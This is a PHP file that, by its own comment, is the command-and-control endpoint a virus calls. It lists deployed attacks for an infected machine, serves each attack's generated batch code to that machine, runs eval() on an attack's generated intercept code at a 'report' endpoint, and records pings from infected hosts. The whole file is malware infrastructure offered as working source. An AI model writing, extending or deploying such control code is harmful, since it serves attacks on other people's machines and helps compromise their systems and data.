<?php /** @noinspection PhpMissingBreakStatementInspection */

require_once(__DIR__ . "/autoload.php");

/**
 * This file is used to communicate with the virus. The virus will make api calls defined here. The current api calls are documented in /code/virus/startup/docs/interface
 */

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Header;
use Kelvinho\Virus\Virus;
use function Kelvinho\Virus\filter;
use function Kelvinho\Virus\logEndpoint;
use function Kelvinho\Virus\logStrayVirus;

$endpoint = $_GET["endpoint"];
$endpoints = explode("/", $_GET["endpoint"]);
$endpoints = filter($endpoints, function ($element) {
    return !empty($element);
});
if ($endpoints < 2) {
    logEndpoint($endpoint);
}
$virus_id = $endpoints[0];
$virus = Virus::get($virus_id);
if ($virus == null) {
    logStrayVirus($virus_id);
}
switch ($endpoints[1]) {
    case "aks":
    case "attacks":
        if (count($endpoints) < 3) {
            echo join("\n", Virus::getAttacks($virus_id, AttackInterface::STATUS_DEPLOYED));
            Header::ok();
        }
        $attack_id = $endpoints[2];
        $attack = @AttackInterface::get($attack_id);
        if ($attack->getStatus() == AttackInterface::STATUS_DEPLOYED) {
            switch ($endpoints[3]) {
                case "code": // /viruses/{virus_id}/attacks/{attack_id}/code
                    echo $attack->generateBatchCode();
                    Header::ok();
                case "report": // /viruses/{virus_id}/attacks/{attack_id}/report
                    eval($attack->generateIntercept());
                    Header::ok();
                default:
                    logEndpoint($endpoint);
            }
        }
        break;
    case "ping":
        $virus->ping();
        Header::ok();
    default:
        logEndpoint($_GET["endpoint"]);
}
